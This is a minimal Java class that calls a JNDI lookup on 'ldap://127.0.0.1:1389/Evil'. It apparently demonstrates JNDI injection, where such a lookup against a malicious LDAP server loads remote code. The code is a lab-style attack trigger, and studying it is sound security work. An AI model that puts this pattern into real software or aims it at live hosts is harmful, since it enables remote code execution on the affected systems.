package org.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDILDAPClient {
    public static void main(String[] args) throws NamingException {
        String url = "ldap://127.0.0.1:1389/Evil";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}
